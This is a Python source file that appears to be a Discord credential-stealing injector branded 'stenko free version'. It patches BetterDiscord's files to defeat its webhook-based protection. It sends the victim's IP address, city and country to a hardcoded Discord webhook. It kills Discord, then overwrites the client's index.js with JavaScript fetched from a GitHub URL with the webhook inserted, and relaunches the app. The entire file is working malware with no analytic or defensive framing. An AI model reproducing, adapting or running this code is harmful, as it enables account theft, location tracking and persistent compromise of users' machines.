
import requests, os , shutil, psutil 

class stenko_free:
    def __init__(self):
        self.webhook = "https://discord.com/api/webhooks/904420868548083722/16zajhYIKeBsS2VAOKRycghFF9taMqTCpfJlOJ8VKgUS6-lD2-WuL3KWN0ELdfnstlAe"
        self.appdata = os.getenv("localappdata")
        self.tempfolder = os.getenv("temp")+"\\stenko"

        try:
            os.mkdir(os.path.join(self.tempfolder))
        except Exception:
            pass

        self.tokens = []
        self.saved = []

        if os.path.exists(os.getenv("appdata")+"\\BetterDiscord"):
            self.bypass_betterdiscord()
            self.sendmsg()
            self.logout()
        try:
            shutil.rmtree(self.tempfolder)
        except (PermissionError, FileExistsError):
            pass

    def logout(self):
        for proc in psutil.process_iter():
            if any(procstr in proc.name().lower() for procstr in\
            ['discord', 'discordcanary', 'discorddevelopment', 'discordptb']):
                proc.kill()
        for root, dirs, files in os.walk(os.getenv("LOCALAPPDATA")):
            for name in dirs:
                if "discord_desktop_core-" in name:
                    try:
                        directory_list = os.path.join(root, name+"\\discord_desktop_core\\index.js")
                        os.mkdir(os.path.join(root, name+"\\discord_desktop_core\\stenko"))
                    except FileNotFoundError:
                        pass
                    f = requests.get("https://raw.githubusercontent.com/razvyc1/injection/master/clean-injection.js").text.replace("%WEBHOOK_LINK%", self.webhook)
                    with open(directory_list, 'w', encoding="utf-8") as index_file:
                        index_file.write(f)
        for root, dirs, files in os.walk(os.getenv("APPDATA")+"\\Microsoft\\Windows\\Start Menu\\Programs\\Discord Inc"):
            for name in files:
                discord_file = os.path.join(root, name)
                os.startfile(discord_file)

    def bypass_betterdiscord(self):
        bd = os.getenv("appdata")+"\\BetterDiscord\\data\\betterdiscord.asar"
        with open(bd, "rt", encoding="cp437") as f:
            content = f.read()
            contentnd = content.replace("api/webhooks", "stenko")
        with open(bd, 'w'): pass
        with open(bd, "wt", encoding="cp437") as f:
            f.write(contentnd)

    def sendmsg(self):
        ip = country = city = "none"
        try:
            data = requests.get("http://ipinfo.io/json").json()
            ip = data['ip']
            city = data['city']
            country = data['country']
        except Exception:
            pass
        msg = {
            "avatar_url": "https://i.imgur.com/mnMYF8Y.jpg",
            "username": "stenko",
            "embeds": [
                {
                    "author": {
                      "name": "stenko free version",
                      "url": "https://stenko.xyz",
                    },
                    "title": "user logged out",
                    "description": f"```ip - {ip}\nlocation - {country}, {city}```",
                    "color": 3092790     
                }
            ]
        }
        requests.post(self.webhook, json=msg)

if __name__ == "__main__":
    stenko_free()
    